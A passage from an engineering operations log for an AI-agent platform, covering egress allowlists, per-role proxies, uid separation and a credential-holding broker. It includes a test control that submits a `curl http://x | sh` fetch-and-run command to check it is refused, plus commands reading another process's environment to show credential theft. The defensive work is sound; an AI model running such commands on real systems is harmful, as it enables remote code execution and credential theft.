directory. The panel holds a code the operator just got from the vendor's page, in memory, for one
hop. It never holds a credential.

So the difference was never "panel versus file". It was **a one-time code handed to the tool that
owns the credential** versus **a long-lived secret typed into a form**. The first is fine; the second
is what §43 refused.

**Which means a package can have the first.** A manifest declares a login and the same helper drives
it:

```yaml
login:
  purpose: the example flow — prints a URL and a code, writes its own token file
  argv: [/opt/venv/bin/python, /work/packages/hello-lane/steps/login.py]
  home_env: [HELLO_LOGIN_DIR]
  done_when: {file: token.json}
```

`login_helper.py` takes `pkg:<name>` wherever it took a provider; the panel has the same three verbs
(`POST /api/packages/<name>/login | code | cancel`) and one read (`GET …/login`); the screen shows
the URL, the code the flow issued, and `연결됨` — and asks only for the one-time code.

**Measured, not described**, which is why the example package carries a login of its own. There is no
service behind it: it prints a URL and a code, takes the code back, writes `token.json`. Driven end
to end through the helper:

```
start   → {"state": "started"}
status  → waiting_for_code, url https://example.invalid/device, user_code HELO-8807
code    → {"ok": true}                 (through the FIFO, into the process's terminal)
status  → connected                    (token.json is there, 0600, opened by nobody)
```

**What this does not become.** A package cannot put code in the panel — `argv` is a list of plain
arguments, a shell line is refused rather than escaped (a control drives that with
`argv: ['sh', '-c', 'curl http://x | sh']` and asserts the declaration is not offered at all), and
the program has to already exist in the governed runtime image. So the honest limits: this is for a
CLI the stack carries, or a step of the package's own — which is what a device flow in twenty lines
of Python is. `gh` is not in the image, so the development workflow keeps its token in
`docker/package.env` today; switching it to a declared flow is its repository's decision, not this
one's.

**463/463 controls**, eight of them new.

## 45. One allowlist, and what a role cannot be given

Asked whether the internet — or GitHub — can be allowed *per role*. It cannot, and the measurement
says why better than the design does.

**What is enforced, and where.** Tool rights are per principal because Preloop authenticates a
credential and can therefore tell principals apart. Hosts are per **network**, because the thing that
decides them is a proxy: it sees a TCP connection from the agent container and nothing else. A
principal is an application-level identity the proxy never learns. So `docker/egress/allow` is one
file for one proxy, shared by every container on the governed network:

```
$ docker exec <agent> curl -s -o /dev/null -w '%{http_code}' https://api.github.com       # direct
000                                        (no route to anything except through the proxy)
$ docker exec <agent> env https_proxy=http://egress:8888 curl … https://api.github.com
200
```

That 200 is the answer to the question. GitHub was opened because the development workflow needed
it, and it is now reachable from the trading package's steps, from every model call, from any step
any package ships. Nine more hosts were opened for one implementer's task the same way.

**What declaring gives, and what it does not.** A package now declares the hosts it reaches, and the
stack reads the allowlist back against those declarations:

```
$ packages.py egress
devflow   github.com                open
trading   opendart.fss.or.kr        open
(nobody)  docs.redhat.com           open — no installed package declares it
```

A bring-up prints the last line, the way it prints an identity no declaration asks for (§40). That is
an audit, not a control: **declaring a host does not open it, and not declaring one does not close
it.** The allowlist stays the operator's file, and the honest reason is that there is nothing
per-role to enforce it with.

**What per-role egress would actually take.** A route of its own — the same argument as the approval
guard in §21, where the boundary is a route and not a right. A role that must reach only GitHub runs
in its own container, on its own network, with its own proxy and its own list; then "which hosts" is
decided by where the connection comes from, which is the only thing a proxy can decide. Anything
short of that is advisory: a second proxy port handed to a step through its environment would be
bypassed by a step that used the shared one, and the same is true of a proxy credential, because
**every role's credential already sits in one container's environment** — the separation between
roles inside the agent rests on each step asking for its own role, not on being unable to ask for
another's. That is worth saying plainly: per-role *tool rights* are enforced by Preloop, per-role
*anything else inside the agent* is convention.

**And the loader was caught lying while this was measured.** The bring-up asked for the orphan-host
report with `python3`, which has no `yaml` module in that image, so `declared()` returned an empty
set and every package was reported as **"not declared in config/packages.yaml"** — blaming the
operator's declaration for a missing library. Now the two answers are different: an unreadable
declaration says so, names the file, and refuses every package until it can be read; an empty one
says nobody declared anything. Controls drive both.

**471/471 controls**, ten of them new.

## 46. Per-workflow domains, and a limit that is not a control

The follow-up to §45 was "then a workflow cannot be limited to its own domains either". It cannot,
and the reason turned out to be sharper than the one in §45 — sharp enough to write down as a limit
of this stack rather than as a thing not built yet.

**Measured.** In the agent container every step runs as the same user (uid 1000, `agent`), and
`/proc/<pid>/environ` of one process is readable by another:

```
$ ls -l /proc/1/environ        →  -r-------- agent
$ head -c 40 /proc/<other pid>/environ
<a market credential, in full, belonging to a step this one has nothing to do with>
```

So a per-workflow egress credential handed to a step through its own process environment is not
isolation: a step of any other workflow, running at the same time, can read it. The same is true of
every credential this stack hands a step — the role principals' MCP tokens and a package's own env
file are read into the *container's* environment, so they are readable by anything running there.
Per-role **tool rights** are still enforced, because Preloop decides those against a credential it
authenticates; what is convention is which credential a step chooses to present.

**Two ways it could be real, and what each costs.** Dropping each package's steps to their own uid
would close the snooping (then `/proc/<pid>/environ` is unreadable across packages) — but dropping
privileges needs the container to start as root, and this runtime deliberately does not. Or the
isolation class gets **a route of its own**: a second agent container, non-root as this one is, on
its own network, with its own proxy and its own allowlist, and the runner sends a run there because
its package asked for it. That is the §21 argument again, and it is the only one of the two that does
not trade a property away.

**No control pins this.** A control says what the stack holds; this section says what it does not.
`packages.py egress` audits *who asked for* each open host (§45) and nothing here claims a workflow
is confined to it. Writing it down is the honest half: the allowlist is a property of the network, so
until an isolation class has a network, "this workflow may reach only these domains" is a sentence
about intent.

## 47. Per-role domains: measured in miniature, not built

§46 said per-workflow domains are a sentence about intent. The reply was the right instinct: make it
**per role** — a workflow already names a role per step (`story=codex:novel-reviewer`), so the role's
list is inherited by whatever workflow uses it, and the stack keeps one identity model instead of two.
And the mechanism proposed was a uid per role. Almost: the uid is half of it, and not the half the
proxy sees.

**What the proxy can see, measured.** A second tinyproxy in the same egress container, its own port,
its own filter file, its own `BasicAuth`:

```
role-a proxy, no credential        api.anthropic.com   000   refused
role-a proxy, with its credential  api.anthropic.com   404   reached (the API answering)
role-a proxy, with its credential  api.github.com      000   refused — not on role-a's list
the shared proxy                   api.github.com      200   open to everything, as §45 says
```

So the unit the proxy understands is **a credential on a port**, not a uid: every process in the
agent shares one container IP, and that is all a proxy learns from a connection. One tinyproxy per
role, because a single instance has one global `Filter` and one global `BasicAuth` — it cannot give
two users two lists.

**What the uid is for, measured.** It is what makes that credential unstealable. §46's hole was that
every step runs as uid 1000 and `/proc/<pid>/environ` is readable across processes. With a uid per
role:

```
$ setpriv --reuid=1001 … env ROLEA_PROXY=… sleep 20      # a step running as role-a
$ setpriv --reuid=1002 … head -c 60 /proc/<that pid>/environ
head: cannot open '/proc/21/environ' for reading: Permission denied
$ setpriv --reuid=1001 … head -c 24 /proc/<that pid>/environ
HOSTNAME=… (its own)
```

Together they are enforcement: the proxy refuses what a role did not ask for, and no other role can
take the credential that gets past the proxy.

**The trade, stated plainly.** `setpriv` needs privilege to drop it, so the agent container would
have to **start as root** — this image ends `USER agent` today and deliberately so. The mitigation is
structural rather than promised: nothing runs as root but the launcher, every step is dropped to a
role uid, and the **role→uid map is the platform's** (`config/principals.yaml`), so a package can
only *name* a role and can never ask for root. Set against what exists now — one uid for every step,
with every role's credential in one environment — the steps end up more confined, not less. But it is
a property traded for a property, and that is the decision to make before building it.

**What building it is.** Per-role `egress:` in `config/principals.yaml` beside `tool_rules`; a uid
per declared role in the image; a root entrypoint that launches each step under `setpriv`; one
tinyproxy per role generated from those lists, with the shared listener cut back to the provider
baseline; the adapter injecting the role's proxy into that step's process environment; and controls
that *measure* it — role A cannot reach role B's host, cannot read role B's credential, and a role
with no list reaches nothing but the providers.

Nothing above is installed. The two measurements are here so the design is not a guess.

## 48. Per-role egress, built

§47 measured the two halves in miniature and named the trade. This is the built version, and the one
place it does not reach yet.

**How a role gets its own hosts.** A role declares them where its rights already live — beside
`tool_rules`, in `config/principals.yaml` or in the package's own `principals.yaml`:

```yaml
principals:
  egress-probe:
    egress: [example.com]
```

`stack/role_egress.py` gives each declaring role a **uid** and a **port** and writes them down
(`config/generated/role-uids.json`) so they never move — a positional assignment would change a
role's uid the day another role is added, and every file that role owns would stop being its own. A
bring-up then creates the role users, writes one tinyproxy configuration per role into a volume the
agent and the proxy share, and restarts the proxy. A role that declares nothing gets none of this and
nothing about it changes: the shared proxy and the provider baseline, as before.

**What each half does.** The proxy holds the role's list — the providers plus what the role declared
— and checks the role's credential, which is the only identity a proxy can learn from a connection.
Measured, live, from the agent:

```
as egress-probe, through its own proxy:   example.com        200   (its declared host)
                                          api.github.com     000   refused — open on the shared list
                                          api.anthropic.com  404   the baseline, reached
with no credential at all:                 anything          000
```

The uid is what keeps that credential from being taken: the file is `0600` owned by the role, and
`/proc/<pid>/environ` is unreadable across uids (§46 measured the opposite when every step was one
user). Dropping to a uid takes privilege this runtime does not have, so exactly one program may do
it — `role-exec`, through a sudoers rule that allows only `agent`, only the `roles` group, and never
root. Measured: the launcher may become a role, may not become root, and a role may not become
another role. `role-exec` also refuses to run a step under a role it is not.

**What had to give.** Three things, each measured rather than guessed:

* `sudo` resets the environment, and a step that lost `CONDUCTOR_SELF_RUN_ID` wrote to the wrong
  workspace and could not authenticate. So the rule carries `SETENV` and the call uses `-E`; what
  `role-exec` then overrides is exactly the proxy.
* `sudo` also replaces `PATH` with `secure_path`, and the node the adapter runs is not on it
  (`FileNotFoundError: node`). `Defaults!ROLE_EXEC !secure_path` keeps the step's own path.
* The run's workspace and the call's evidence directory are shared between the steps of a run by
  design, so they are `setgid` and group-writable by `roles`. And a role's step reads the Preloop
  permission hook and the provider login the adapter presents, which are shared by every step in
  this container today — so the group gets those too. **Per-role egress is about hosts. Provider
  credentials are not per-role**, and the honest reason is §46's: they live in one container.

**Where it stops, per vendor.** A model step as a role is one question per CLI, and asking it of all
three is the whole answer (the Claude login was renewed for this; the first attempt hit an expired
token, which is the operator's to fix and not a finding):

| | as its own role | what happened |
|---|---|---|
| **claude** | **works, end to end** | `COMPLETED`, wrote its file through the role's own rights, `produced: true`, 69k tokens |
| **codex** | **works, given a login of its own** | it does not chmod what it does not own — see below |
| **grok** | not applicable | it cannot take a principal at all, and never could: `mcp_principal is not supported for grok: its Preloop credential comes from its own config file`. Nothing to do with uids |

The claude path was measured on a real role with real rights: `novel-reviewer` declared `egress: []`
— *the providers and nothing else* — and the lane completed, wrote `review_r9.json` through its own
tool rules, and from inside that role:

```
api.anthropic.com  404   the baseline, reached
api.github.com     000   refused, and the shared allowlist has it open
example.com        000   refused — another role declared that host, not this one
```

That is per-role egress doing exactly what was asked for, on a model step.

**Why codex looked impossible, and what it actually was.** The CLI's own messages sent this the
wrong way — `could not create PATH aliases`, then `Codex could not find bubblewrap on PATH`, then a
bare `Error: Operation not permitted`. It reads like a sandbox that will not start under a strange
uid. It is not. EPERM is what `chmod` returns on a file you do not own, and that is exactly what a
role got:

```
as the role, on the shared codex login:
  read  /route/codex/auth.json   yes
  write /route/codex/auth.json   yes
  chmod /route/codex/auth.json   Operation not permitted
```

The Codex CLI sets the mode of its credential file when it starts — reasonable, and fatal for
anyone who is not its owner. Given a login directory the role owns, the same step **COMPLETED**
(`gpt-6-astra`), through the role's uid and the role's proxy. Claude never hit this because it does
not chmod that file.

So the rule in the runner is about the **login**, not the vendor: a codex step whose role would run
as its own uid is allowed when the login belongs to that role, and refused otherwise — with the fix
in the refusal:

```
egress-probe declares egress of its own, so this step runs as that role's uid — and the codex login
'codex' belongs to uid 1000. The Codex CLI sets the mode of its credential file when it starts, and
chmod on a file you do not own is refused. Give this role a login of its own — connect one named for
it and run this step on it — or drop the role's egress declaration.
```

A login of its own is not a workaround: a login here is already a named directory (`claude-b`,
`claude-absent` exist for other reasons), the panel connects one under any name, and two roles with
separate logins also get separate vendor sessions and separate quota. What was **not** kept is the
shortcut used to measure it — a *copy* of the shared login, chowned to the role. Two copies of one
refresh token is how you invalidate a login you still need; the copy was deleted and all three
logins re-checked afterwards.

**Grok's is a different shape entirely, and the same fix would reach it.** It is not about uids: the
adapter cannot hand grok a credential at all, because grok never connected the MCP server offered
over ACP (measured: no connection attempt, ~5 minutes per tool call waiting on a server "still
connecting"). The one that works is registered in grok's **own config file** inside its login
directory. So grok reads its Preloop credential from a file, which is why `mcp_principal` — a
per-call override — cannot apply. A per-role *login*, whose config file carries that role's
credential, is the shape that would give grok roles too. Not built.

**And a step that would be confined but cannot be is now refused by name.** Running it unconfined
would hand the role the shared list it declared its way out of; running it anyway ends in a vendor
error three layers down that says nothing about roles. So:

```
egress-probe declares egress of its own, so this step would run as that role's uid — and the codex
CLI cannot: it builds its own sandbox and exits 'Operation not permitted' under a uid other than the
one that installed it (OPERATIONS §48). Either this role runs its model steps on claude, or it drops
its egress declaration and shares the allowlist.
```

`novel-reviewer`'s declaration was **taken back out**: novel-a runs that role on grok as well, which
cannot take a principal at all, and on codex through the shared login. What is true today: **a role
whose model steps run on claude, or on a codex login of its own, can be confined to its own domains
now.** Grok needs the per-role login shape described above; §47's other route — a container per
isolation class — still reaches everything and depends on no vendor.

**505/505 controls**, and the rule they pin is the login's owner, not the vendor's name — no host on the internet is contacted by a
control; what the proxy does with a declared host is the measurement above.

## 49. "Grok never connected" was true once, and is not true now

§48 repeated a finding from the routing work: grok ignores an MCP server handed over ACP, which is
why its Preloop credential comes from its own config file and why `mcp_principal` — a per-call
override — cannot apply to it. Asked *why* it never connected, and the honest first answer was that
nobody had found out: FINDINGS-281 records the observation ("its log shows no connection attempt")
and the workaround, not a cause.

Measured now, against grok 1.0.40 in this image:

**It advertises the capability.** Its ACP `initialize` reply:
`"mcpCapabilities":{"http":true,"sse":true}`.

**It connects.** Handed an HTTP MCP server pointing at a listener of ours, it posts to it — twice,
unprompted:

```
POST /mcp  server/discover   _meta io.modelcontextprotocol/protocolVersion 2026-07-28
POST /mcp  initialize        protocolVersion 2025-11-25
```

**And against the real server it completes the handshake and pulls the tools.** Preloop's own access
log, for `grok-cli/1.0.40`, four requests per session and the same shape every time:

```
POST /mcp/v1  400    (its first protocol version, refused)
POST /mcp/v1  200    (the one they agree on)
POST /mcp/v1  202
POST /mcp/v1  200   11189 bytes     ← the tool list
```

So the 400 is a version negotiation that succeeds on the retry, not a failure. What misled this
session was grok's ACP reply: `session/new` returns `"mcpServers": []` (or `null`) **while the
server is connected and answering** — the field is not the evidence, and reading it as such is how
"no server attached" was concluded twice in one afternoon, by me.

**What this changes.** `mcp_principal is not supported for grok` is now a statement about an older
grok, kept in our adapter as a fact about grok. If the credential can go in the ACP `session/new`
headers — and it demonstrably can — then grok can take a principal, which means per-role tool rights
and per-role egress reach it exactly as they reach claude. Not done here: the same earlier session
found two other grok behaviours that were worked around at the time (it imported Claude's settings
from `$HOME`, and it asked the client about its own MCP calls), and whether those resurface on the
ACP-handed path needs a real run, not a handshake.

**What is worth keeping from this beyond grok**: a vendor limitation recorded once is an assumption
from then on, and this one survived three months and two rewrites of the thing it constrained. The
adapter says it in a comment, the docs repeat it, and nothing re-asked the CLI until someone did.

## 50. Grok takes a principal, and a confined role needs a login of its own

§49 ended with "not built": if grok can be handed an MCP server over ACP, it can take a principal,
and per-role rights and egress reach it. Built now, and measured on real calls.

**Grok takes a principal.** The adapter hands the server over ACP — under the same name its own
configuration uses — with that principal's credential, instead of refusing the request:

```
grok, principal novel-reviewer, "write {WS}/review_r7.json"     COMPLETED, produced: true,
                                                                approvals_requested: 0
grok, principal novel-reviewer, "write {WS}/zz_not_allowed.json"  DENIED, mcp_rule_denials: 1
```

The second line is the one that matters: `novel-reviewer` may write `review_r*` and nothing else, and
that is the rule set that decided. Had grok been using the credential in its own config file — the
reason a principal was refused for three months — a different rule set would have answered.

**And a confined role needs a login of its own.** §48 made this a codex-specific rule on the strength
of a codex-specific error. It is not about the vendor:

| | what the CLI does with its credential file |
|---|---|
| codex | sets its mode when it starts — `chmod` on a file you do not own is EPERM |
| grok | reads an `auth.json` it keeps at `0600`, so a role cannot even read it |
| all three | **rewrite it when the token refreshes** |

That last row is the finding. An operator can grant the roles group access to a shared login, and it
works — until the vendor refreshes the token and writes the file back at `0600`, owned by whoever
ran it. Measured exactly that way: grok's `auth.json` had group access in the morning and came back
`-rw-------` in the afternoon, and the role's step failed with `Permission denied.` So the rule in
the runner is now general — a step that would run as a role's uid is allowed when that role owns the
login, and refused otherwise, with the fix in the refusal.

Sharing is the trap, because it works at first. Owning is the arrangement.

**508/508 controls.**

## 51. H1: network identity without file identity — the review that pulled a conclusion back

A review of §46–§50 found the chain **egress isolation → uid separation → per-role vendor login**
one arrow too long: the first arrow was never proven. The requirement was per-role *network*
identity; the design reached for uid separation to protect a proxy credential, and the uid dragged
the vendor's *file* identity — and therefore the login — along with it. What §48–§50 actually
proved is narrower and still stands: **different uids cannot co-manage one vendor auth file**
(codex chmods it, grok keeps it 0600, all three rewrite it on refresh). That is a fact about
sharing auth across uids, not a fact about egress.

**The three axes, separated properly** (the review's model, adopted):

| axis | identity | held by |
|---|---|---|
| vendor | one shared OS login, uid 1000, one HOME | the login directory, as today |
| Preloop | the logical role principal | a **trusted adapter/supervisor** — never the step's environment |
| network | an egress *profile* | whatever namespaces the traffic |

Two corollaries. Roles map to egress **profiles**, and the isolation objects number as the profiles
do — twenty roles over three policies is three objects, not twenty. And the principal credential
must stop travelling as container-wide environment: §46 already measured that same-uid processes
read each other's environment, so possession of `PRELOOP_MCP_*` proves nothing about who a step is.
Role identity should be **assigned at spawn** by the supervisor, not claimed by credential.

**Constraints measured today, before adopting the implementation:**

* **A netns cannot be made inside the governed container.** `unshare -n` is EPERM even as root:
  the bounding set (`a80425fb`) carries neither `SYS_ADMIN` nor `NET_ADMIN`, deliberately. So
  "`ip netns exec` per profile" translates, in this stack, to **a Docker network per profile with a
  thin sibling agent container attached to it** — a Docker network *is* a netns, created by the
  daemon's privilege rather than by a capability grant to the governed runtime. Same image, same
  volumes, same uid, same HOME; only the network differs. The §47 costing ("a container per class")
  was priced per role-class before the cardinality point; per profile it is two or three.
* **`ptrace_scope` is 0** in this kernel — which is *why* the §46 environ measurement came out the
  way it did. With Yama at 1, same-uid siblings cannot read each other's environment (descendants
  only). A host-level knob for the whole WSL VM, so noted as hardening, not flipped in passing.
* **The shipped codex binary supports `cli_auth_credentials_store`: `keyring`, `ephemeral`** (0.155.1,
  measured by symbol presence). §48's "codex must own its login" was a fact about the `file`
  backend, generalized too far. Headless usability of the other backends: unmeasured.

**Retractions and freezes:**

* *Retracted:* "separate logins give separate vendor sessions and separate quota" (§50). OAuth
  sessions on one account share that account's allowance; separate quota needs a separate account
  or budget identity, not a separate refresh token.
* *Downgraded to unmeasured:* "copying a login invalidates the original via refresh-token
  divergence" (§48) — a reasonable fear, asserted, never measured, and vendor-specific.
* *Frozen, scoped:* the §48/§50 ownership rule and the §46–§47 "a route or a uid are the only real
  arrangements" conclusions hold **for the uid-based design**, which is no longer the presumed
  design. The uid mechanism stays in place and passing (508/508) until H1 replaces or confirms it.

**H1, adopted as the next experiment.** Same uid and HOME and vendor login for every role; egress
by profile-attached execution; principals held by the adapter, assigned at spawn. Acceptance:

```
same uid / same vendor auth                              PASS required
author → its profile's hosts / anything else             PASS / DENY
reviewer → its profile's hosts / anything else           PASS / DENY
principal secret in step env or on shared filesystem     NONE
reviewer claiming author's principal                     DENY
codex / claude / grok token refresh under this shape     PASS
```

The open problem H1 must answer honestly: **dispatch authentication.** With one uid, "which profile
does this step run in" is decided by whoever launches it, and a step must not be able to launch
work into a wider profile than its own. Spawn-time binding (inherited descriptors, the supervisor
choosing the target) is the shape; whether it holds at ptrace_scope 0 is part of the measurement,
not an assumption. And one boundary stays stated: if a compromised role must not read another
role's *vendor* token, same-uid cannot deliver that — that requirement, if it arrives, is §47's
container boundary, knowingly.

## 52. H1 slice 1: the substrate holds

Built and measured the same day §51 was written. Two egress profiles, each a Docker network with
exactly two members: a tinyproxy carrying that profile's list, aliased `egress`, and a sibling
agent container — same image, same volumes, same uid 1000, same HOME, no `principals.env`. Nothing
in `stack/` changed: inside a profile, the name `egress` *is* the profile, so every step, CLI and
adapter keeps today's configuration and lands on the profile's list.

Measured from inside both siblings:

```
                              probe (example.com + providers)   closed (providers only)
uid / user / HOME             1000 / agent / /home/agent         same
example.com                   200                                000  denied
api.github.com (shared list   000  denied                        000  denied
 has it open)
providers baseline            reached                            reached
the shared proxy              no route                           no route
direct internet               no route                           no route
PRELOOP_MCP_* in env          0                                  0
claude auth status            loggedIn: true                     —
codex login status            Logged in using ChatGPT            —
grok auth.json                readable                           —
```

Three §48-era problems are gone **by construction** rather than by rule: no chmod on another uid's
file (there is no other uid), no 0600 auth file a role cannot read (same owner), no refresh
rewriting permissions out from under anyone (the writer is the owner everywhere). The per-role
proxy credential is gone too — the network is the identity, so there is nothing to steal and
nothing for §46's environ-reading to take. And the isolation objects count as the *profiles* do:
two policies, two networks, ~14 MB of proxies.

**What slice 1 does not answer**, held for slice 2:

* **Dispatch**: a step of profile A must not be able to start work in profile B's container. The
  siblings have no Preloop and no docker socket, and nothing listens in them yet — dispatch does
  not exist, so today this holds vacuously. The supervisor design (§51) is the real answer.
* **Preloop from inside a profile**: tool calls need the MCP endpoint, which lives on the governed
  network. A `services` network carrying Preloop-guard and MLflow — and *not* any egress proxy —
  is the intended shape, so a profile's internet stays its own while its tools stay governed.
* **A real model step end to end**, and refresh observed over days rather than asserted.

`up.sh` integration, controls and the role→profile mapping in `principals.yaml` follow once slice 2
confirms the shape. The uid-based mechanism from §48 keeps running beside this until then.

## 53. H1 slice 2: tools without egress, and a model step inside a profile

Slice 1 proved the network identity; slice 2 gives a profile what a step needs that is *not*
internet, and runs the real thing inside.

**The `services` network.** Internal, carrying exactly the Preloop guard (same `api` / `console`
aliases the governed network uses) and MLflow — and no egress proxy, so membership grants tools and
records, never a route out. Measured from inside the probe profile: MCP 401 (up, refusing without a
credential), API read 200, `mlflow` 200 — and the guard still refuses a control-plane write with
403, so §21's route-boundary carries into profiles unchanged.

**A real model step, inside the profile, no special handling.** `agent_task.py` run in
`agent-probe` exactly as it runs in the main agent:

```
claude  COMPLETED  produced: true   {"h1": "slice2"} written through Preloop, 0 approvals
codex   COMPLETED  produced: true   {"h1": "codex"}  — the §48 codex problem, gone by construction:
                                     same uid as the login's owner, nothing to chmod across
```

And the traffic went where the design says it must. The **profile proxy's own log** for the claude
call:

```
CONNECT api.anthropic.com:443        Established        ← the model call, on the profile's list
CONNECT http-intake.logs.us5.datadoghq.com:443
NOTICE  Proxying refused on filtered domain             ← the CLI's telemetry, not on any list
```

The shared proxy logged zero anthropic connections in the same window. Nothing in `stack/` changed
for any of this: inside a profile, `egress`, `console`, `api` and `mlflow` mean what they mean
everywhere else — they just resolve to the profile's own proxy and the shared services.

**Acceptance so far** (§51's table): same uid PASS, same vendor auth PASS (claude and codex, real
calls), profile hosts PASS / everything else DENY (curl and the CLI's own traffic), principal
secrets in the profile environment NONE, telemetry refused as a side effect. Open: impersonation /
dispatch (slice 3, the supervisor–broker), refresh observed over time rather than at a moment, and
grok's lane.

**Slice 3 is the honest hard part**, and §51 named it: with one uid and a shared `/work`, a step
can write anything a supervisor can, so "who may start work in which profile" cannot be decided by
anything a step could also do. The direction that survives scrutiny so far: a **broker under a uid
of its own** in the main agent — not per role, one — holding the dispatch right and the Preloop
principal credentials (§51's custody point), telling a profile's runner what to run, with steps
never holding what they would need to forge it. uid 1000 cannot read a 1050-owned 0600 file or
trace a 1050 process (measured in §48's series), so the boundary is real without any vendor CLI
ever running under the broker's uid — which is what kept uids poisonous in §48–§50.

## 54. H1 slice 3: the broker

The hard part §51 named, built as §53 sketched it: **one process holds the Preloop principal
credentials and the dispatch right, and it is not a process a step can reach into.** Its own
container, uid 1050 — one broker, not one per role — with `/work` read-only and `principals.env`
delivered to it alone. The profile agents now receive no credential of any kind. No vendor CLI ever
runs under the broker's uid, which is what kept per-role uids poisonous in §48–§50: the poison was
CLIs meeting foreign uids, and the broker never runs one.

**The shape.** `POST /dispatch` runs one model step as a role, in the profile that role's own
declaration names (`egress_profile:`, read beside `tool_rules` — never from the caller). The
`dispatch` network carries broker and runners and nothing else; the main agent has no route to a
runner, so the broker's door is the only door. A dispatched step authenticates its MCP traffic with
an **opaque per-job token**; the broker's forward swaps it for the role's real credential, which
exists in exactly one process. The runner pins the argv around `agent_task.py` — a request is data.

**Measured, live:**

```
dispatch novel-reviewer / claude, write review_r5.json
    → profile closed, COMPLETED, produced: true, approvals 0     (the file is there)
same path, write zz_bad.json
    → DENIED, mcp_rule_denials: 1, nothing written               (the role's rules decided,
                                                                  through the forward)
role with no egress_profile          → 403, by name
caller claims a different profile    → 403: "declared to run in 'closed', not 'probe'"
a dead or invented token at /mcp/v1  → 401 "not a live job token"
main agent → runner-closed:8790      → no route
PRELOOP_MCP_* in any profile agent   → 0
```

**The honest limits, stated where they are load-bearing.** Anything on the governed network — steps
included — may call `/dispatch`. What a forged dispatch obtains is a governed model step, as a
declared role, under that role's rules, inside that role's profile: what a workflow could ask for
legitimately. Spend, not escalation; tightening the caller side is the remaining slice, and the
run-token idea from §51 is still the candidate. And two roles mapped to one profile can steal each
other's *live job tokens* (same uid, one container): a token is one role's rights for one job's
lifetime, so map roles that must not share that to different profiles.

**Where H1 stands against its acceptance table:** same uid PASS · same vendor auth PASS (claude and
codex, real calls) · per-profile hosts PASS/DENY by curl, by the CLI's own traffic, and now through
the broker · principal secret in step env or filesystem NONE · impersonation of an unmapped role or
a foreign profile DENY · token refresh over days and grok's lane still open. The uid-based §48
mechanism keeps running beside this until the remainder closes; wiring the *workflows* (tasks.py
fan-out members through `/dispatch`) is the integration step that follows the experiment.

## 55. H1 integrated: the door is picked by the role's declaration

The experiment became the platform. A fan-out member — and a chain's model step — whose role
declares `egress_profile:` now runs through the broker, in that profile's container, on that
profile's network; a role that declares nothing runs exactly as before. The swap is one entrypoint
(`broker_dispatch.py`, agent_task's argv to the letter), so the receipt, the retry loop and the
recorder cannot tell the doors apart. Opt-in by declaration: no existing workflow changed.

**Measured on the workflow that exercises all three vendors.** `novel-reviewer` mapped to the
providers-only profile; `novel-a` run end to end:

```
PASS: no blocking finding in the required reviews
receipt:  story    codex   COMPLETED  produced  {"role":"novel-reviewer","profile":"closed"}
          history  claude  COMPLETED  produced  {"role":"novel-reviewer","profile":"closed"}
          cold     grok    COMPLETED  produced  {"role":"novel-reviewer","profile":"closed"}
closed profile's own proxy log, same window:
          api.anthropic.com ×34   chatgpt.com ×19   api.x.ai ×10
```

Three vendors, three brokered lanes, one profile, and the profile's proxy carried every vendor
connection — grok's lane filling the last cell of the matrix (brokered grok had already produced
its file in isolation the same day). Where a member ran is in its receipt now (`dispatched`),
because where it ran is part of what happened.

**The retired key is named, not broken.** `egress: [hosts]` — per-role hosts, the uid-based
design's declaration — still works mid-migration, and every `principals.py apply` lists who is
still on it. Today that list is `devflow-researcher`, `devflow-research-reviewer` (declared in the
devflow package while the uid design was current — its session gets the one-line migration) and
`egress-probe`. `docs/packages.md` now teaches `egress_profile:` only.

**Still open, still honest:** the `/dispatch` caller side (spend-not-escalation stands, run-tokens
remain the tightening candidate); refresh observed over days; and removing the uid machinery —
role-exec, the per-role proxies, sudoers — once the deprecation list is empty. The mechanism stays
frozen and passing until then, because a record of why it exists (§48–§50) reads better beside the
code it describes than after its deletion.

**523/523 controls.**

## 56. The run-token, measured before it was built — and not built

§54 left "tighten the `/dispatch` caller side" as the next slice, with a per-run token as the
candidate. Before building it, the property it depends on was measured, because §51's dispatch
question deserved an answer that is not theater:

```
$ AGENTSTACK_RUN_TOKEN=zz-secret-probe sleep 15 &          # a live run holding its token
$ grep -ao "AGENTSTACK_RUN_TOKEN=..." /proc/<pid>/environ  # any sibling process, same uid
AGENTSTACK_RUN_TOKEN=zz-secret-probe
```

At `ptrace_scope 0` — this kernel's setting, measured in §51 — **any process in the agent reads any
live run's environment.** A run token would be stolen by exactly the forger it exists to stop, in
one line. There is nowhere else in a one-uid container to keep it either: a 0600 file has the same
owner, and every channel a step could use is a channel a step could read. Building the token now
would decorate the API without changing what an attacker can do, and this stack does not ship
decorations (§46 said the same about a different lock).

**So the standing state is stated instead of papered over.** `/dispatch` is callable by anything on
the governed network; what a forger obtains is a governed model step, as a declared role, under
that role's rules, inside that role's profile — spend, not escalation (§54). The two changes that
would make caller authentication *real*, both outside this repository's own reach:

* **`kernel.yama.ptrace_scope = 1`** on the host kernel. One knob, VM-wide, the operator's to set:
  same-uid environment reads stop (descendants only), and a run token becomes worth minting. The
  knob, the trade (it applies to everything in the WSL VM, debuggers included), and the decision
  are the operator's; the stack's part — minting in the broker, checking at `/dispatch` — is a
  small slice once the ground holds it.
* Or the launcher moves outside the governed container entirely, which is a larger redistribution
  of the start path than the risk it retires.

**Also in this slice:** the panel's overview now asks the broker itself for its state (`map`,
`jobs_live`) rather than showing a copy of the configuration; `egress-probe` is annotated as the
frozen §48 mechanism's deliberate probe — the one role that stays on the retired `egress:` key
until that machinery is deleted, so the controls that still measure role-exec and the per-role
proxies measure something real. And the refresh observation window is open: the shared logins have
been exercised from profile containers since 2026-09-26; what a token refresh does to them is a
fact the calendar delivers, not a test.

**524/524 controls.**

## 57. Who owns a profile

Asked directly: is an egress profile the package's or the stack's? The split, and it is the same
split §45 drew for the shared allowlist:

* **A profile is the operator's.** Its allowlist file (`docker/egress/profiles/<name>.allow`), its
  proxy and its runner are provisioned at the instance — a package cannot create one or widen one
  by declaring harder. The broker now says so where the line is crossed: a role mapped to a name
  this instance does not provision is refused with the provisioned list and where profiles are
  made, instead of the muddy "runner did not answer" it used to produce.
* **A mapping is a reference, and a package may make one.** `egress_profile: <name>` in a package's
  `principals.yaml` is the same trust-on-install as its tool rules (§27) — it names which existing
  profile a role runs in, nothing more. The platform's own `config/principals.yaml` wins a name
  clash, so the operator can override a package's mapping without editing the package.
* **A package's channel for needs stays what §45 made it**: `requires.egress` is the audit that
  says which hosts it wants, and its README asks the operator for a profile shaped like that.

**Measured the same hour it was written, by someone else.** The devflow session migrated off the
retired key while this section was being drafted: two new profiles (`research`,
`research-review`) provisioned instance-side — allow files, proxies, runners, committed — and the
